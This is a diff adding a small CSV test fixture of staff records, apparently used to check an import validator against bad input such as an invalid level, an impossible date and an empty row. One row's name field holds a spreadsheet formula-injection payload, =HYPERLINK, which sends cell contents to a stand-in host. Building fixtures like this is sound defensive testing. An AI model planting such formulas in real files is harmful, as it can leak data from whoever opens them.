@@ -1,0 +1,5 @@
+Short Name,Email,Phone,Position,Level,Joined
+S. Level,badlevel@example.test,0501112222,Resident,PGY7,2024-01-01
+S. Date,baddate@example.test,0501113333,Resident,R1,31/02/2026
+,,,,,
+=HYPERLINK("http://x/?"&A1),formula@example.test,0501114444,Resident,R1,2024-01-01
